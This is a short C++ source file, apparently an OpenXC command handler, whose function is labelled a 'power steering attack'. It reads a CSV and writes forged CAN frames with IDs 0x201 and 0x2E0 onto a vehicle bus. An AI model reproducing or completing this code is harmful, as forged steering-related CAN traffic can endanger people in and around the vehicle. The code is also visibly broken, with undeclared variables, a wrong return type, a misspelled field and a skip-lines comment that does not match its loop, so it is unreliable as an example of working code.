//Contains handlers for translations in commmand library.

namespace can = openxc::can; 
using openxc::can::lookupSignal;

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <stdlib.h>

const int ROWS = 16885;
const int COLS = 22;
const int BUFFSIZE = 80;

int readCSV() {
	
	int array[ROWS][COLS];
	char buff[BUFFSIZE];
	std::ifstream file( "textread.csv" );
	std::string line; 
	int col = 0;
	int row = 0;
	
    if (!file.is_open())
    {
        std::exit(EXIT_FAILURE);
    }

	for (i = 1; i < 98; i++){
    	std::getline(file, line); // skip the first 98 lines
	}

	while( std::getline( file, line ) ) {
	
		std::istringstream iss( line );
		std::string result;
	
		while( std::getline( iss, result, ',' ) ) {

		    array[row][col] = atoi( result.c_str() );
		    col = col+1;
	  	}
		row = row+1;
		col = 0;
	}
	return array;
}


//Handler to conduct power steering attack
void powerSteeringHandler(const char* name, openxc_DynamicField* value,
	openxc_DynamicField* event, CanSignal* signals, int signalCount) {

	bool attack = value->boolen_value;//this probably isn't right

	if (attack == true) {

		array = readCSV();
		can_message = {0x201, STANDARD, {0x2B, 0x88, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 8};
		message = {0x2E0, STANDARD, {0x2B, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 8};
	}


	can::write::enqueueMessage(bus, &can_message);
	can::write::flushOutgoingCanMessageQueue(bus);

}


